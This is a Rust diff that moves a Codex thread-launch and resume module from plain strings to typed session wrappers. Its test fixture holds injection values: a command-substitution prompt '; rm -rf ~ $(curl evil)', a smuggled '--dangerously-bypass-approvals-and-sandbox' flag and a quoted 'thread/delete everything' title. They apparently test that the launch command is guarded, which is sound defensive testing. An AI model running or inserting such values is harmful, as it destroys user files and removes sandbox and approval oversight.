@@ -1,6 +1,7 @@
 //! Creates named Codex threads and prepares resume launches.
 
 use pwf_application::ports::agent::PreparedAgentLaunch;
+use pwf_models::session::{AgentModel, LaunchPrompt, SessionThreadTitle, SessionWorkingDirectory};
 use pwf_wire::task::session::{AgentLaunch, AgentProbe};
 
 use super::{
@@ -15,11 +16,11 @@ const BINARY: &str = "codex";
 const THREAD_ID_PREVIEW: &str = "<thread-id returned by thread/start>";
 
 struct CodexLaunchPlan {
-    title: String,
-    project_path: String,
-    model: Option<String>,
+    title: SessionThreadTitle,
+    project_path: SessionWorkingDirectory,
+    model: AgentModel,
     effort: CodexReasoningEffort,
-    prompt: String,
+    prompt: LaunchPrompt,
 }
 
 impl From<&AgentLaunch> for CodexLaunchPlan {
@@ -35,7 +36,7 @@ impl From<&AgentLaunch> for CodexLaunchPlan {
 }
 
 pub(super) fn probe() -> AgentProbe {
-    super::probe(BINARY)
+    super::probe(pwf_models::session::Agent::Codex, BINARY)
 }
 
 pub(super) fn preview(launch: &AgentLaunch) -> Vec<String> {
@@ -56,8 +57,8 @@ fn prepare_with_binary(
     let plan = CodexLaunchPlan::from(launch);
     let named_thread = start_and_name_thread(
         app_server_binary,
-        &plan.title,
-        &plan.project_path,
+        plan.title.as_ref(),
+        plan.project_path.as_ref(),
         plan.model.as_deref(),
         plan.effort,
     )?;
@@ -71,14 +72,15 @@ fn prepare_with_binary(
 
 fn resume_argv(plan: CodexLaunchPlan, thread_id: String) -> Vec<String> {
     let mut argv = LaunchArgv::new(BINARY).positional("resume");
-    if let Some(model) = plan.model {
+    if let Some(model) = plan.model.into_inner() {
         argv = argv.flag("--model", model);
     }
     argv = argv.flag(
         "-c",
         format!("model_reasoning_effort=\"{}\"", plan.effort.as_str()),
     );
-    argv.positional(thread_id).into_guarded(plan.prompt)
+    argv.positional(thread_id)
+        .into_guarded(plan.prompt.to_string())
 }
 
 #[cfg(test)]
@@ -87,7 +89,10 @@ mod tests {
     use anyhow::{Context as _, Result};
     use pwf_application::ports::agent::PreparedAgentLaunch;
     use pwf_models::{
-        session::{Agent, SessionEffort},
+        session::{
+            Agent, AgentModel, LaunchPrompt, SessionEffort, SessionThreadTitle,
+            SessionWorkingDirectory,
+        },
         task::TaskId,
     };
     use pwf_wire::task::session::AgentLaunch;
@@ -103,11 +108,12 @@ mod tests {
         let launch = AgentLaunch {
             agent: Agent::Codex,
             task_id: TaskId::try_new("PWF-0068")?,
-            title: "\"; thread/delete everything".to_string(),
-            project_path: "/projects".to_string(),
-            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox"
-                .to_string(),
-            model: Some("gpt-8-billion".to_string()),
+            title: SessionThreadTitle::new("\"; thread/delete everything".to_string()),
+            project_path: SessionWorkingDirectory::new("/projects".to_string()),
+            prompt: LaunchPrompt::new(
+                "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox".to_string(),
+            ),
+            model: AgentModel::from(Some("gpt-8-billion".to_string())),
             effort: SessionEffort::Max,
         };
 
